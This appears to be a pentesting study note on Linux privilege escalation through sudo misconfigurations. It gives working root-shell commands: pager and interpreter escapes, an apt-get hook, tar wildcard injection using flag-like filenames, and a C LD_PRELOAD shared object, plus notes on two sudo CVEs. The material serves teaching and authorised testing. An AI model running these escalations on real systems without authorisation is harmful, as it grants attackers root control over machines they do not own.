---
tags: [linux, privesc, pentesting, red-team]
difficulty: intermediate
module: "44 - Linux Privilege Escalation"
topic: "44.06 Sudo Misconfigurations"
---

# Sudo Misconfigurations

## 1. Executive Summary

The `sudo` (Superuser DO) utility allows a system administrator to delegate authority, granting specific users or groups the ability to run designated commands as `root` (or another user) without sharing the root password. 

Because `sudo` is the primary mechanism for administrative access on modern Linux systems, its configuration file (`/etc/sudoers`) is frequently modified. Complex environments often lead to poorly conceived rules, such as overly permissive wildcard usage, environmental variable preservation, or the granting of `sudo` rights on binaries capable of escaping to a shell. 

Exploiting `sudo` misconfigurations is statistically one of the most common and reliable methods for privilege escalation during engagements.

## 2. Enumeration and `sudo -l`

The first step in exploiting sudo is checking what privileges the current user has been granted.
```bash
sudo -l
```
This command lists the allowed (and forbidden) commands for the invoking user. 
*Note: Depending on the system configuration, running `sudo -l` might require the user's password. If the attacker has a shell but no password, this vector might be temporarily blocked unless a `NOPASSWD` directive exists.*

**Example Output Analysis:**
```text
User sanchit may run the following commands on dev-server:
    (root) NOPASSWD: /usr/bin/find
    (ALL : ALL) /usr/bin/less /var/log/syslog
    (root) NOPASSWD: /usr/bin/apt-get
    (root) SETENV: NOPASSWD: /usr/bin/python3
```

## 3. Vector 1: Intended Functionality Abuse (GTFOBins)

The most direct sudo exploit occurs when a user is allowed to run a binary as root, and that binary has internal mechanisms that allow shell execution.

### 3.1. Shell Escapes via Pagers (`less`, `more`, `man`)
If `sudo -l` shows `(root) /usr/bin/less /var/log/syslog`:
1. Run `sudo less /var/log/syslog`
2. Once the pager opens, type `!/bin/sh` and hit Enter.
3. The pager drops into a root shell because the pager itself was executed as root.

### 3.2. Scripting Languages (`python`, `perl`, `ruby`)
If allowed to run a language interpreter as root:
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### 3.3. Package Managers (`apt`, `dpkg`, `yum`)
Package managers often allow pre/post-execution hooks.
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

## 4. Vector 2: Wildcard Injection

Administrators often use wildcards (`*`) in the sudoers file to allow users to execute a command on multiple files. 
Example rule: `(root) NOPASSWD: /bin/tar -czvf /var/backups/backup.tar.gz *`

Because bash expands the `*` before passing the arguments to `tar`, an attacker can create files in the directory with names that look like command-line flags.

**Exploitation (Tar Checkpoint Abuse):**
```bash
# Create files that tar will interpret as arguments
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "/bin/bash -c 'chmod +s /bin/bash'" > shell.sh
chmod +x shell.sh

# Run the sudo command; the wildcard expands our malicious filenames
sudo /bin/tar -czvf /var/backups/backup.tar.gz *
```
Tar reads `--checkpoint=1` as a flag, triggering the execution of `shell.sh` as root.

## 5. Vector 3: Environment Variable Preservation (LD_PRELOAD)

By default, `sudo` strips dangerous environment variables (like `LD_PRELOAD` or `LD_LIBRARY_PATH`) to prevent attackers from loading malicious libraries into a root process. However, administrators can override this by adding `env_keep+=LD_PRELOAD` to the sudoers file.

**Mechanics of LD_PRELOAD:**
`LD_PRELOAD` forces the dynamic linker to load a specified shared object (`.so`) before any other C libraries. By doing this, an attacker can hijack standard C functions (like `printf` or `geteuid`). Even easier, they can define an `_init()` function, which executes automatically when the library is loaded.

**Exploitation Steps:**
1. Check `sudo -l` for: `Matching Defaults entries for sanchit: env_reset, env_keep+=LD_PRELOAD`
2. Write a malicious C shared object (`exploit.c`):
   ```c
   #include <stdio.h>
   #include <sys/types.h>
   #include <stdlib.h>
   #include <unistd.h>

   void _init() {
       unsetenv("LD_PRELOAD"); // Prevent infinite loops
       setgid(0);
       setuid(0);
       system("/bin/bash");
   }
   ```
3. Compile: `gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles`
4. Execute any allowed sudo command while passing the variable:
   ```bash
   sudo LD_PRELOAD=/tmp/exploit.so find
   ```

## 6. Sudo Vulnerabilities (CVEs)

Sudo itself has historically suffered from memory corruption vulnerabilities.

- **CVE-2019-14287 (Sudo bypass via UID -1):** If the sudoers file contains `(ALL, !root)`, preventing root execution, an attacker could bypass it using `sudo -u#-1 command`.
- **CVE-2021-3156 (Baron Samedit):** A critical heap-based buffer overflow in `sudo`. An attacker could exploit this by passing a backslash (`\`) at the end of command-line arguments. It allowed privilege escalation on default installations without needing the user to be in the sudoers file.

## 7. LD_PRELOAD Shared Object Hijacking (ASCII Diagram)

```text
+-------------------------------------------------------------------------------+
|                      LD_PRELOAD PRIVILEGE ESCALATION FLOW                     |
+-------------------------------------------------------------------------------+
|                                                                               |
|  1. ATTACKER COMMAND                                                          |
|  $ sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find                                 |
|          |                                                                    |
|          v                                                                    |
|  +---------------------------------------+                                    |
|  | /etc/sudoers VALIDATION               |                                    |
|  | - Is user allowed to run find? YES    |                                    |
|  | - Is env_keep+=LD_PRELOAD set? YES    |                                    |
|  +---------------------------------------+                                    |
|          |                                                                    |
|          v                                                                    |
|  2. KERNEL DYNAMIC LINKER (ld.so)                                             |
|     Loads libraries in order of precedence:                                   |
|                                                                               |
|     [1] /tmp/evil.so (Forced by LD_PRELOAD) <------- Executes _init() here!   |
|     [2] /lib/x86_64-linux-gnu/libc.so.6             |                         |
|     [3] /lib/x86_64-linux-gnu/libm.so.6             v                         |
|                                                                               |
|  +-------------------------------------------------------------------------+  |
|  | void _init() {                                                          |  |
|  |     setuid(0);            // Process is running as root due to sudo     |  |
|  |     system("/bin/bash");  // Spawns root shell BEFORE find executes     |  |
|  | }                                                                       |  |
|  +-------------------------------------------------------------------------+  |
|                                                                               |
+-------------------------------------------------------------------------------+
```

## 8. Chaining Opportunities

- **Web Shell to Sudo:** Gain initial access via RCE on a web application as `www-data`. Enumerate `sudo -l` to find `www-data` can restart the Apache service via a custom script. Modify the script or exploit wildcards within it to gain a root shell.
- **Password Reuse:** Find a local config file with a hardcoded password. Use `su` to switch to that user, run `sudo -l`, input the found password, and discover extensive `NOPASSWD` rights.

## 9. Related Notes
- [[01 - Linux PrivEsc Methodology Overview]]
- [[02 - Enumeration Tools]]
- [[03 - SUID Binaries Abuse]]
- [[05 - Capabilities Abuse]]
- [[07 - Writable etc passwd]]
